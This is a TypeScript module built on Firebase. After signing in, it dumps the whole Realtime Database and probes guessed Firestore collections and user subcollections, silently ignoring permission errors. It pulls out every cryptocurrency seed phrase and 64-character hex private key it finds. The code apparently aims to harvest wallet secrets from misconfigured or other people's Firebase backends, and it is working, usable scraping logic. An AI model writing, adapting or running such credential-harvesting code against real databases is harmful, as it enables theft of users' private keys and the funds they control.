import { initializeApp } from 'firebase/app';
import {
  getAuth,
  signInWithEmailAndPassword as firebaseSignInWithEmail,
  signOut as firebaseSignOut,
  onAuthStateChanged,
  type User,
} from 'firebase/auth';
import { getDatabase, ref, get } from 'firebase/database';
import {
  getFirestore,
  collection,
  getDocs,
  doc,
  getDoc,
} from 'firebase/firestore';

const firebaseConfig = {
  apiKey:            import.meta.env.VITE_FIREBASE_API_KEY,
  authDomain:        import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
  databaseURL:       import.meta.env.VITE_FIREBASE_DATABASE_URL,
  projectId:         import.meta.env.VITE_FIREBASE_PROJECT_ID,
  storageBucket:     import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
  appId:             import.meta.env.VITE_FIREBASE_APP_ID,
};

const app = initializeApp(firebaseConfig);
export const auth = getAuth(app);

export type { User };

export async function signInWithEmail(email: string, password: string): Promise<void> {
  await firebaseSignInWithEmail(auth, email, password);
}

export async function signOut(): Promise<void> {
  await firebaseSignOut(auth);
}

export async function getIdToken(): Promise<string | null> {
  const user = auth.currentUser;
  if (!user) return null;
  return user.getIdToken();
}

export function onAuthChange(callback: (user: User | null) => void): () => void {
  return onAuthStateChanged(auth, callback);
}

// ── Firebase Realtime Database ────────────────────────────────────────────────

function extractCredentials(node: unknown, out: string[] = []): string[] {
  if (node === null || node === undefined) return out;
  if (typeof node === 'string') {
    const t = node.trim();
    // 64-char hex private key
    if (/^(?:0x)?[a-fA-F0-9]{64}$/.test(t)) {
      out.push(t);
      return out;
    }
    // 12–24 word mnemonic
    const words = t.toLowerCase().replace(/\s+/g, ' ').split(' ').filter(w => /^[a-z]+$/.test(w));
    if ([12, 15, 18, 21, 24].includes(words.length)) {
      out.push(words.join(' '));
    }
    return out;
  }
  if (typeof node === 'object') {
    for (const v of Object.values(node as Record<string, unknown>)) {
      extractCredentials(v, out);
    }
  }
  return out;
}

/**
 * Reads the entire Firebase RTDB from the browser and returns all
 * mnemonic phrases and private keys found anywhere in the tree.
 */
export async function readRtdbCredentials(): Promise<string[]> {
  const db = getDatabase(app);
  const snapshot = await get(ref(db, '/'));
  return extractCredentials(snapshot.val());
}

// ── Firestore ─────────────────────────────────────────────────────────────────

/**
 * Reads wallets / mnemonics / private keys from Firestore.
 * Tries every common top-level collection and user-specific sub-collection.
 * Extracts any mnemonic phrase (12-24 words) or private key (64-char hex)
 * found in any field of any document.
 */
export async function readFirestoreCredentials(): Promise<string[]> {
  const db = getFirestore(app);
  const uid = auth.currentUser?.uid;
  const out: string[] = [];

  const TOP_COLLECTIONS = [
    'wallets', 'phrases', 'mnemonics', 'accounts',
    'keys', 'credentials', 'users',
  ];
  const USER_SUBCOLLECTIONS = [
    'wallets', 'phrases', 'mnemonics', 'accounts', 'keys', 'credentials',
  ];

  // Top-level collections
  for (const name of TOP_COLLECTIONS) {
    try {
      const snap = await getDocs(collection(db, name));
      snap.forEach(d => extractCredentials(d.data(), out));
    } catch { /* permission denied — skip */ }
  }

  // User-owned sub-collections and the user document itself
  if (uid) {
    try {
      const userDoc = await getDoc(doc(db, 'users', uid));
      if (userDoc.exists()) extractCredentials(userDoc.data(), out);
    } catch {}

    for (const sub of USER_SUBCOLLECTIONS) {
      try {
        const snap = await getDocs(collection(db, 'users', uid, sub));
        snap.forEach(d => extractCredentials(d.data(), out));
      } catch {}
    }
  }

  // Deduplicate while preserving order
  return [...new Set(out)];
}
